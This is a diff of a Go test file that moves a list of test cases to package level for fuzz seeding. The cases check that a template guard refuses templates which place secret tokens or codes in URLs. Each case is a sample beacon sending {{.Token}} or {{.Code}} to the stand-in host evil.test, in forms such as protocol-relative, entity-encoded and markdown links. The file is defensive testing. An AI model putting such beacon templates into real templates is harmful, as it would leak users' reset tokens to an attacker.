@@ -22,45 +22,48 @@ import (
 // it is the control-character placeholder, which is not URL-shaped, so the
 // text check does not confuse a reset link the operator meant with a beacon.
 
+// textBeaconCases is package-level so the fuzz corpus can seed from the same
+// list this test pins, rather than from a copy that drifts out of step with it.
+var textBeaconCases = []struct {
+	name string
+	src  string
+}{
+	{
+		name: "https URL carrying the token",
+		src:  `<p>https://evil.test/p?t={{.Token}}</p>`,
+	},
+	{
+		name: "http URL carrying the code",
+		src:  `<p>http://evil.test/?c={{.Code}}</p>`,
+	},
+	{
+		name: "printf-built URL carrying the token",
+		src:  `<p>{{printf "https://evil.test/%s" .Token}}</p>`,
+	},
+	{
+		name: "protocol-relative URL carrying the token",
+		src:  `<p>Click //evil.test/p?t={{.Token}} now</p>`,
+	},
+	{
+		name: "www-form URL carrying the token",
+		src:  `<p>www.evil.test/p?t={{.Token}}</p>`,
+	},
+	{
+		name: "HTML-entity scheme still linkifies",
+		src:  `<p>https&#58;//evil.test/p?t={{.Token}}</p>`,
+	},
+	{
+		name: "mixed with a legitimate whole link",
+		src:  `<p>{{.URL}}</p><p>https://evil.test/?t={{.Token}}</p>`,
+	},
+	{
+		name: "markdown-shaped autolink text",
+		src:  `<p>[reset](https://evil.test/{{.Token}})</p>`,
+	},
+}
+
 func TestGuardRefusesSecretBearingAutolinkText(t *testing.T) {
-	beacons := []struct {
-		name string
-		src  string
-	}{
-		{
-			name: "https URL carrying the token",
-			src:  `<p>https://evil.test/p?t={{.Token}}</p>`,
-		},
-		{
-			name: "http URL carrying the code",
-			src:  `<p>http://evil.test/?c={{.Code}}</p>`,
-		},
-		{
-			name: "printf-built URL carrying the token",
-			src:  `<p>{{printf "https://evil.test/%s" .Token}}</p>`,
-		},
-		{
-			name: "protocol-relative URL carrying the token",
-			src:  `<p>Click //evil.test/p?t={{.Token}} now</p>`,
-		},
-		{
-			name: "www-form URL carrying the token",
-			src:  `<p>www.evil.test/p?t={{.Token}}</p>`,
-		},
-		{
-			name: "HTML-entity scheme still linkifies",
-			src:  `<p>https&#58;//evil.test/p?t={{.Token}}</p>`,
-		},
-		{
-			name: "mixed with a legitimate whole link",
-			src:  `<p>{{.URL}}</p><p>https://evil.test/?t={{.Token}}</p>`,
-		},
-		{
-			name: "markdown-shaped autolink text",
-			src:  `<p>[reset](https://evil.test/{{.Token}})</p>`,
-		},
-	}
-	for _, tc := range beacons {
+	for _, tc := range textBeaconCases {
 		t.Run(tc.name, func(t *testing.T) {
 			err := guardTemplate([]byte(tc.src))
 			if err == nil {
